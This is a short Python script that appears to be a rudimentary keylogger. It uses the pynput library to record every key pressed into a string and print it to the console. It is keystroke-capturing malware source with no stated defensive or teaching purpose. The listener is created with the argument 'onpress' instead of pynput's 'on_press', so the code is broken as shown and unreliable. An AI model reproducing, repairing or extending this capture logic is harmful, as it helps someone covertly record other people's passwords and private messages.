import pynput.keyboard


log = ""
def process_key_press(key):
	global log
	log = log + str(key)

	print(log)


keyboard_listner = pynput.keyboard.Listener(onpress=process_key_press)

with keyboard_listner:
	keyboard_listner.join()




